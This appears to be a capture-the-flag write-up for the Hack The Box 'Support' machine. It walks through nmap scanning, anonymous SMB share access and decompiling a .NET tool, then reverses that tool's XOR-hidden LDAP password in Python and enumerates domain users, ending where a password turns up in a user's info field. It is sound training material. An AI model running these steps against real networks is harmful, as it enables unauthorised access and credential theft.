---
link:
description:
release date:
tags:
image:
solved:
solve date:
machine no.:
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">"Machine Name" Writeup</p></div>

  <img src="badge link" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Author(s): "htb username"</p>
    <p style="margin: 0;">Difficulty: Easy/Medium/Hard/Insane</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Verify Target is Reachable

Why this step: Before enumerating, confirm the VPN tunnel actually routes to the target and note any OS fingerprint the response leaks.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `ping`
    - **Description:** Sends ICMP echo requests to a host and reports replies and round-trip time.
    - **Purpose:** Confirms the target is live and reachable over the HTB VPN before spending time on port scans.
- `-c 4`
    - **Description:** Count — stop after sending 4 packets.
    - **Purpose:** Bounds the check to a quick, finite sample instead of pinging forever.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ ping -c 4 10.129.230.181  
PING 10.129.230.181 (10.129.230.181) 56(84) bytes of data.
64 bytes from 10.129.230.181: icmp_seq=1 ttl=127 time=224 ms
64 bytes from 10.129.230.181: icmp_seq=2 ttl=127 time=224 ms
64 bytes from 10.129.230.181: icmp_seq=3 ttl=127 time=228 ms
64 bytes from 10.129.230.181: icmp_seq=4 ttl=127 time=228 ms

--- 10.129.230.181 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 224.416/226.332/228.333/1.905 ms
```

**Key finding:** the host is reachable with 0% packet loss, and `ttl=127` indicates a Windows target (initial TTL of 128, decremented by one hop) — this frames every enumeration choice that follows toward Windows/AD services.

**Next:** With reachability and a likely-Windows OS confirmed, map the attack surface by scanning ports and fingerprinting services.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 Scan All Ports

A quick full-range sweep establishes the complete attack surface before committing time to version detection, so no listening service is missed.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP`

**Breakdown:**

- `nmap`
    - **Description:** Network mapper — probes hosts for open ports and running services.
    - **Purpose:** Enumerates every reachable TCP port on the target.
- `-p-`
    - **Description:** Scan all 65,535 TCP ports rather than the default top 1,000.
    - **Purpose:** Ensures high ephemeral RPC ports and any non-standard service are captured.
- `--min-rate 5000`
    - **Description:** Send packets at a minimum of 5,000 per second.
    - **Purpose:** Keeps a full-range scan fast enough to be practical against a high-latency VPN target.
- `-Pn`
    - **Description:** Skip host discovery and treat the host as up.
    - **Purpose:** Avoids missing the target if it filters ICMP, and reachability was already confirmed by ping.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ nmap -p- --min-rate 5000 -Pn 10.129.230.181 | grapo
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-22 05:59 +0000
Nmap scan report for 10.129.230.181
Host is up (0.43s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49664/tcp open  unknown
49667/tcp open  unknown
49678/tcp open  unknown
49690/tcp open  unknown
49703/tcp open  unknown
49741/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 41.67 seconds

53,88,135,139,389,445,464,593,636,3269,5985,49664,49667,49678,49690,49703,49741
```

**Key finding:** the open-port profile — Kerberos (88), LDAP (389/636/3269), SMB (445), DNS (53), WinRM (5985) — is the classic fingerprint of a Windows Active Directory Domain Controller, with no web service present.

**Next:** Run version and script detection against the named service ports to confirm the domain and identify the host role.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.2 Run a Targeted Deep Scan

The full sweep found the ports; a scripted version scan on the meaningful service ports is needed to confirm the domain name and DC hostname required for host-file entries and later LDAP/SMB work.

**Command:** `nmap -A -p 53,88,135,139,389,445,464,593,636,3269,5985 TARGET_IP`

**Breakdown:**

- `-A`
    - **Description:** Aggressive scan — enables version detection (`-sV`), default scripts (`-sC`), OS detection, and traceroute in one flag.
    - **Purpose:** Pulls service versions and LDAP/SMB script data that reveal the domain and host role.
- `-p 53,88,135,139,389,445,464,593,636,3269,5985`
    - **Description:** Restrict the scan to this explicit port list.
    - **Purpose:** Targets only the named AD service ports, deliberately excluding the dynamic high RPC ports (49664+) that add scan time without actionable results.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ nmap -A -p 53,88,135,139,389,445,464,593,636,3269,5985 10.129.230.181
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-22 06:04 +0000
Nmap scan report for 10.129.230.181
Host is up (0.23s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-22 06:04:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-22T06:04:57
|_  start_date: N/A
|_clock-skew: -19s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   231.72 ms 10.10.14.1
2   232.39 ms 10.129.230.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.01 seconds
```

**Key finding:** the domain is `support.htb` and the host role is `DC`, confirming the target is the domain controller `dc.support.htb`; SMB 3.1.1 requires message signing.

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

|Port|Service|Version|Analysis|Simple Explanation|
|---|---|---|---|---|
|53|DNS|Simple DNS Plus|AD-integrated DNS; confirms domain-controller role, can be queried for records.|This machine is the "phone book" for the network — another sign it's a domain controller.|
|88|Kerberos|Microsoft Windows Kerberos|AD authentication; enables Kerberos attacks (later used for the S4U/RBCD ticket request).|The system that hands out login "tickets." We abuse it at the end to become admin.|
|135 / 593|MSRPC / RPC-over-HTTP|Microsoft Windows RPC|Endpoint mapper; supports RPC-based enumeration.|A directory that tells programs where to find Windows services. Mostly plumbing.|
|139 / 445|NetBIOS / SMB|Microsoft-DS|File sharing — primary enumeration target; check for anonymous share access.|Windows file sharing. This is our way in — we look for folders open to anyone.|
|389 / 636 / 3269|LDAP / LDAPS / Global Catalog|AD LDAP|Directory service; leaks `Domain: support.htb`. Queryable for users once bind creds are obtained.|The database of all users and groups. Once we get a password, we can read it.|
|464|kpasswd|—|Kerberos password change service; presence reinforces DC role.|The "change your password" service for Kerberos. Just confirms this is a DC.|
|5985|WinRM|Microsoft HTTPAPI 2.0|Remote management; the intended shell path once valid credentials are recovered.|Remote control for Windows. Once we have a valid login, this gives us a shell.|

**What this gives you:** The surface is a Domain Controller with no web attack surface; SMB is the only service that may permit anonymous access, making it the first enumeration target.

**Next:** Add the discovered domain to `/etc/hosts`, then enumerate SMB shares for anonymous access.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Add the Domain to the Hosts File

The Nmap LDAP banner revealed the domain `support.htb` and host `dc.support.htb`; name-based tools and the target binary resolve these names rather than the raw IP, so map them locally before proceeding.

**Command:** `echo 'TARGET_IP support.htb dc.support.htb' | sudo tee -a /etc/hosts`

**Breakdown:**

- `tee -a /etc/hosts`
    - **Description:** Writes stdin to a file; `-a` appends rather than overwriting.
    - **Purpose:** Adds the domain-to-IP mapping without clobbering existing entries, run under `sudo` because `/etc/hosts` is root-owned.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ echo '10.129.230.181 support.htb dc.support.htb' | sudo tee -a /etc/hosts
[sudo] password for kali: 
10.129.230.181 support.htb dc.support.htb

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ cat /etc/hosts | grep support
10.129.230.181 support.htb dc.support.htb
```

**What this gives you:** Both `support.htb` and `dc.support.htb` now resolve to the target, satisfying the name resolution the LDAP tooling and the later CIFS ticket request depend on.

**Next:** With name resolution in place, enumerate SMB shares for anonymous access.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.3 SMB Enumeration
#### 2.3.1 Enumerate SMB Shares Anonymously

The port scan exposed SMB (445) with no web surface; listing shares under a null session tests whether the DC leaks a non-default share reachable without credentials.

**Command:** `smbclient -L \\\\TARGET_IP\\ -N`

**Breakdown:**

- `smbclient`
    - **Description:** Samba command-line client for accessing SMB/CIFS shares.
    - **Purpose:** Interacts with the target's file-sharing service from Linux.
- `-L \\\\TARGET_IP\\`
    - **Description:** List the shares available on the given host.
    - **Purpose:** Enumerates every share name the server advertises to our session.
- `-N`
    - **Description:** No password — attempt a null/anonymous session.
    - **Purpose:** Tests for unauthenticated access, since no credentials are yet known.

**Why four backslashes:** The backslash doubling is shell escaping, not SMB syntax. An SMB (UNC) path is written `\\TARGET_IP\share`. In bash, `\` is the escape character, so each literal backslash must be doubled to survive to the program: the four leading backslashes collapse to two (the UNC host prefix) and each doubled pair before a name collapses to one. Single-quoting the path instead — `smbclient '\\TARGET_IP\support-tools' -N` — disables escaping and is equivalent.

**Shares ending in `$`:** A trailing `$` marks a hidden administrative share that Windows creates automatically and does not advertise in normal browsing. `C$` and `ADMIN$` map to the `C:\` drive and `C:\Windows` and require administrative credentials to access. `IPC$` holds no files — it is the named-pipe endpoint that carries RPC calls and permits the null session that makes this anonymous listing possible. These are default plumbing and are not accessible anonymously; a share with no `$` and no default role (here, `support-tools`) is human-created and therefore the point of interest.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ smbclient -L \\\\10.129.230.181\\ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.230.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

**Key finding:** the DC permits anonymous SMB enumeration and exposes a non-default share, `support-tools`, described as "support staff tools" — the standard shares (`ADMIN$`, `C$`, `IPC$`, `NETLOGON`, `SYSVOL`) are expected noise.

**Next:** Connect to the `support-tools` share anonymously and list its contents to identify anything worth extracting.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.2 List and Retrieve the Share Contents

The anonymous listing exposed a non-default `support-tools` share; connecting to it and enumerating its files identifies any custom artifact that could contain hardcoded logic or credentials.

**Command:**

```
smbclient \\\\TARGET_IP\\support-tools -N
ls
get UserInfo.exe.zip
```

**Breakdown:**

- `smbclient \\\\TARGET_IP\\support-tools -N`
    - **Description:** Opens an interactive anonymous session to the named share.
    - **Purpose:** Provides a shell into `support-tools` to browse and download files.
- `ls`
    - **Description:** Lists files in the current share directory.
    - **Purpose:** Reveals which files are stock installers versus a custom binary worth investigating.
- `get UserInfo.exe.zip`
    - **Description:** Downloads the named file from the share to the local working directory.
    - **Purpose:** Retrieves the one non-standard artifact for offline analysis.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ smbclient \\\\10.129.230.181\\support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 17:01:06 2022
  ..                                  D        0  Sat May 28 11:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 11:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 11:19:55 2022
  putty.exe                           A  1273576  Sat May 28 11:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 11:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 17:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 11:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 11:19:43 2022

                4026367 blocks of size 4096. 970317 blocks available
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (58.6 KiloBytes/sec) (average 58.6 KiloBytes/sec)
smb: \> exit
```

**Key finding:** every file except `UserInfo.exe.zip` is a well-known off-the-shelf utility; the custom, recently-added `UserInfo.exe.zip` is the artifact worth reverse-engineering.

**Next:** Unzip the archive locally and identify the executable's file type to choose an analysis approach.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.4 Unzip and Identify the Binary

The custom `UserInfo.exe.zip` was pulled from the share; extracting it and fingerprinting the executable determines whether it can be decompiled to source or must be reverse-engineered at the assembly level.

**Command:**

```
unzip UserInfo.exe.zip
file UserInfo.exe
```

**Breakdown:**

- `unzip UserInfo.exe.zip`
    - **Description:** Extracts the archive contents into the current directory.
    - **Purpose:** Unpacks the executable and its dependency DLLs for analysis.
- `file UserInfo.exe`
    - **Description:** Reports a file's type by inspecting its header, not its extension.
    - **Purpose:** Confirms the binary's format to select the correct analysis tooling.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ unzip UserInfo.exe.zip 
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config     

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ ls
CommandLineParser.dll                                      System.Buffers.dll                          UserInfo.exe
Microsoft.Bcl.AsyncInterfaces.dll                          System.Memory.dll                           UserInfo.exe.config
Microsoft.Extensions.DependencyInjection.Abstractions.dll  System.Numerics.Vectors.dll                 UserInfo.exe.zip
Microsoft.Extensions.DependencyInjection.dll               System.Runtime.CompilerServices.Unsafe.dll
Microsoft.Extensions.Logging.Abstractions.dll              System.Threading.Tasks.Extensions.dll

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ file UserInfo.exe     
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```

**Key finding:** `UserInfo.exe` is a .NET assembly, which compiles to intermediate language and decompiles back to near-original C# source — its logic, including any hardcoded credentials, can be read directly.

**Next:** Decompile the assembly and inspect its authentication routine to recover how it binds to the LDAP server.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.5 Decompile and Analyze the Authentication Logic

**Why this step:** `UserInfo.exe` is a .NET assembly confirmed earlier; decompiling it exposes how the tool authenticates to LDAP, which is the only lead toward valid domain credentials.

**Command:**

```
ilspycmd UserInfo.exe > UserInfo_decompiled.cs
grep -n -A15 'class Protected' UserInfo_decompiled.cs
grep -n -A8 'public LdapQuery' UserInfo_decompiled.cs
```

**Breakdown:**

- `ilspycmd UserInfo.exe`
    - **Description:** Command-line ILSpy decompiler; reconstructs C# source from a .NET assembly.
    - **Purpose:** Converts the binary back into readable source to inspect its logic.
- `> UserInfo_decompiled.cs`
    - **Description:** Redirects decompiled output to a file.
    - **Purpose:** Saves the source for grepping and reference.
- `grep -n -A15 'class Protected'`
    - **Description:** Prints the matching line plus 15 following lines, with line numbers.
    - **Purpose:** Isolates the credential-handling class without reading the whole file.

**The situation.** You have a file, `UserInfo.exe`. It's a program someone on the support team wrote. When a developer writes a program, they write it in **source code** — human-readable text with variable names, functions, and comments. Then they "compile" it, which translates that readable text into a machine-runnable file (the `.exe`). Normally that compilation is a one-way street: the `.exe` is meant to be _run_, not _read_. If you open a typical `.exe` in a text editor you get garbage.

**Why .NET is different.** This program was written in a Microsoft framework called **.NET** (the `file` command told us: "Mono/.NET assembly"). .NET programs don't compile all the way down to raw machine code. They compile to a halfway stage called **intermediate language (IL)**, and — this is the key part — IL keeps a lot of the original structure: the class names, the method names, the logic. That makes .NET programs **decompilable**: you can run the process backward and recover something very close to the original source code. Java has the same property. Programs written in C or C++ generally do _not_ — those really are a one-way street.

**What a decompiler is.** A decompiler is a tool that reads a compiled file and reconstructs readable source code from it. **ILSpy** is a well-known decompiler for .NET. `ilspycmd` is just its command-line version — no graphical window, you run it from the terminal.

**What a `.cs` file is.** `.cs` is the file extension for **C# source code** (pronounced "C-sharp"). C# is the main programming language people use to write .NET programs. So a `.cs` file is a plain text file containing C# — exactly the kind of readable source the original developer wrote. You can open it in any text editor.

**So what did this command do:**

```
ilspycmd UserInfo.exe > UserInfo_decompiled.cs
```

Read it in three parts:

- `ilspycmd UserInfo.exe` — "take this compiled .NET program and decompile it back into C# source code."
- `>` — this is the shell's **redirect** operator. By default the decompiled source would just scroll past on your screen. The `>` says "instead of printing to the screen, capture all that output and write it into a file."
- `UserInfo_decompiled.cs` — the name of the file to write it into. We gave it the `.cs` extension because the content _is_ C# source.

Net effect: we turned an unreadable executable into a readable `.cs` text file sitting in your folder.

**Why we did it.** We can't see what `UserInfo.exe` does just by looking at the binary. But this program clearly _connects to something and logs in_ (it's a "user info" tool on a domain controller). Programs that log in somewhere must contain credentials _somewhere_. By decompiling it to source, we could **read its actual logic** — and that's exactly what paid off: we found the `Protected` class holding an obfuscated password and the `LdapQuery` code showing it logs into LDAP as `support\ldap`. Reading the source is how we discovered credentials the developer thought were safely hidden inside a compiled binary.

The `grep` commands after were just a convenience — instead of reading the whole `.cs` file top to bottom, we jumped straight to the two sections we cared about (`class Protected` and `LdapQuery`).

**`LdapQuery`** — the whole reason this binary is interesting is that it logs into the domain's LDAP server. Any code that logs in somewhere has to, at some point, construct a connection with a username and password. A class or method named `LdapQuery` is the obvious place that connection is built. Grepping it confirmed exactly that: it calls `new DirectoryEntry("LDAP://support.htb", "support\\ldap", password)` — there's the server, the username, and a `password` variable.

> LDAP — **Lightweight Directory Access Protocol**. It's the protocol used to talk to a _directory service_: a centralized database of an organization's users, groups, computers, and their attributes.
> 
> Think of it as the **phone book of a Windows domain**. When a company has hundreds of employees, it needs one place that answers questions like "who is user `jsmith`?", "what groups is she in?", "what's her email, her job title, her manager?" — and, for computers, "is this machine part of the domain?" That central store is the directory. On a Windows network it's called **Active Directory**, and LDAP is the language you use to query it. That's why you saw ports 389 (LDAP) and 636 (LDAPS, the encrypted version) open in your scan — this box is a domain controller, so it _is_ the directory.

**`Protected`** — that grep followed from what `LdapQuery` showed us. The connection line used a `password` variable that came from `Protected.getPassword()`. So the actual secret wasn't in `LdapQuery` at all; it was handed over by a class called `Protected`. Naturally we grepped `Protected` next to see where that password comes from — and that's the class holding the encrypted blob, the key `armando`, and the XOR decryption routine.

The big lesson, and it's a real-world one: **hardcoding a secret in a compiled program does not hide it.** Anyone who can get the file can decompile it and read the secret back out. That's the entire foothold of this box.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ ilspycmd UserInfo.exe > UserInfo_decompiled.cs

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ ls UserInfo_decompiled.cs   
UserInfo_decompiled.cs

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ grep -n -A15 'class Protected' UserInfo_decompiled.cs
73:     internal class Protected
74-     {
75-             private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
76-
77-             private static byte[] key = Encoding.ASCII.GetBytes("armando");
78-
79-             public static string getPassword()
80-             {
81-                     byte[] array = Convert.FromBase64String(enc_password);
82-                     byte[] array2 = array;
83-                     for (int i = 0; i < array.Length; i++)
84-                     {
85-                             array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
86-                     }
87-                     return Encoding.Default.GetString(array2);
88-             }

┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ grep -n -A8 'public LdapQuery' UserInfo_decompiled.cs
96:             public LdapQuery()
97-             {
98-                     //IL_0018: Unknown result type (might be due to invalid IL or missing references)
99-                     //IL_0022: Expected O, but got Unknown
100-                    //IL_0035: Unknown result type (might be due to invalid IL or missing references)
101-                    //IL_003f: Expected O, but got Unknown
102-                    string password = Protected.getPassword();
103-                    entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
104-                    entry.AuthenticationType = (AuthenticationTypes)1;
```

**Key finding:** the binary binds to LDAP as `support\ldap` using a password obfuscated with a recoverable XOR scheme — the ciphertext (`enc_password`), the key (`armando`), and the algorithm (XOR with key, then `0xDF`) are all present, so the plaintext can be reproduced offline.

**Next:** Reimplement the decryption in Python to recover the `ldap` bind password.

> **Ciphertext (encryption) is reversible — two-way.** You take plaintext, apply a key and an algorithm, and get ciphertext. Crucially, if you have the key and the algorithm, you can run it _backward_ and recover the exact original plaintext. Encryption exists so that authorized parties _can_ get the data back. That's precisely what we did: the binary carried the ciphertext (`0Nv32...`), the key (`armando`), and the algorithm (XOR with the key, then `0xDF`) — all three — so we just reversed it and out popped `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. No guessing involved.
> 
> **A hash is one-way — you can't reverse it.** A hash function takes input and produces a fixed-length fingerprint (e.g. `5f4dcc3b5aa765d61d8327deb882cf99` for the word `password` in MD5). There is no "decrypt" operation and no key — the math only runs forward. If someone hands you a hash, you _cannot_ mathematically turn it back into the original. The only way to "recover" it is to **guess**: hash millions of candidate passwords yourself and look for one whose fingerprint matches. That's what tools like `john` and `hashcat` do — brute-force and dictionary attacks, not decryption. If the original was long and random, you may never crack it.
> 
> The quick tells:

|                    | Ciphertext (encryption)            | Hash                              |
| ------------------ | ---------------------------------- | --------------------------------- |
| Direction          | Two-way (encrypt ↔ decrypt)        | One-way only                      |
| Needs a key        | Yes                                | No                                |
| Get original back? | Yes, if you have the key           | No — only guess-and-check         |
| Purpose            | Store/transmit secrets recoverably | Verify without storing the secret |
| How you "break" it | Find the key + algorithm           | Crack it (john/hashcat)           |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.6 Recover the LDAP Password

The decompiled `getPassword()` routine reveals a reversible XOR obfuscation; reimplementing it in Python turns the stored ciphertext into the usable plaintext `ldap` bind password.

**Command:**

```
python3 decrypt.py
```

with `decrypt.py` containing:

```python
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223  # 0xDF

res = ''
for e, k in zip(enc_password, cycle(key)):
    res += chr(e ^ k ^ key2)
print(res)
```

**Breakdown:**

- `base64.b64decode(...)`
    - **Description:** Decodes the Base64 `enc_password` string into raw bytes.
    - **Purpose:** Reproduces the first step of the binary's `getPassword()`.
- `cycle(key)`
    - **Description:** Repeats the key `armando` indefinitely to pair with each ciphertext byte.
    - **Purpose:** Mirrors the `key[i % key.Length]` indexing so the key wraps across the data.
- `e ^ k ^ key2`
    - **Description:** XORs each byte with the key byte, then with `0xDF` (223).
    - **Purpose:** Applies the exact two XOR operations from the binary to recover plaintext.

**Result:**

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

**Key finding:** the `ldap` account's plaintext bind password is `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`, giving authenticated read access to the domain's LDAP directory.

**Next:** Use these credentials with `ldapsearch` to bind to the directory and enumerate domain users for anything sensitive.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.7 Enumerate Domain Users via LDAP

The recovered `ldap` bind password grants authenticated directory access; querying LDAP enumerates every domain user and, critically, any non-standard attribute (such as `info`) that may leak a secret.

**Command (connectivity test — full dump):**

```
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb"
```

**Command (refined — targeted attributes):**

```
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(objectClass=user)" sAMAccountName info
```

**Command (refined — grep-filtered):**

```
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(objectClass=user)" sAMAccountName info | grep -iE 'sAMAccountName|info:'
```

**Breakdown:**

- `-x`
    - **Description:** Use simple authentication rather than SASL.
    - **Purpose:** Binds with a plain username and password, matching how the binary authenticates.
- `-H ldap://support.htb`
    - **Description:** URI of the LDAP server to contact.
    - **Purpose:** Points the query at the domain controller by hostname.
- `-D 'ldap@support.htb'`
    - **Description:** Bind DN — the account authenticating to the directory.
    - **Purpose:** Logs in as the recovered `ldap` service account.
- `-w '...'`
    - **Description:** Password for the bind DN.
    - **Purpose:** Supplies the XOR-decrypted `ldap` password.
- `-b "dc=support,dc=htb"`
    - **Description:** Search base — the point in the directory tree to start from.
    - **Purpose:** Scopes the search to the entire `support.htb` domain.
- `"(objectClass=user)"`
    - **Description:** Search filter restricting results to user objects.
    - **Purpose:** Excludes computers, containers, and other noise so only accounts are returned.
- `sAMAccountName info`
    - **Description:** Attribute list — return only these fields per object.
    - **Purpose:** Requests just the login name and the free-text `info` field instead of every attribute.

**Why the refined queries:** The first command carries no filter and no attribute list, so it returns every object with all attributes — a large dump that confirms the bind works but is impractical to read. It is used only as a connectivity test. The second query adds `(objectClass=user)` plus an explicit `sAMAccountName info` attribute list to return only accounts and the two fields of interest; the third pipes that through `grep` to collapse the LDIF spacing into a compact, scannable list. The refinements do not change access — they narrow the same authenticated read down to the signal.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/Retired/Support]
└─$ ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(objectClass=user)" sAMAccountName info | grep -iE 'sAMAccountName|info:'
# requesting: sAMAccountName info 
sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: DC$
sAMAccountName: krbtgt
sAMAccountName: ldap
info: Ironside47pleasure40Watchful
sAMAccountName: support
sAMAccountName: smith.rosario
sAMAccountName: hernandez.stanley
sAMAccountName: wilson.shelby
sAMAccountName: anderson.damian
sAMAccountName: thomas.raphael
sAMAccountName: levine.leopoldo
sAMAccountName: raven.clifton
sAMAccountName: bardot.mary
sAMAccountName: cromwell.gerard
sAMAccountName: monroe.david
sAMAccountName: west.laura
sAMAccountName: langley.lucy
sAMAccountName: daughtler.mabel
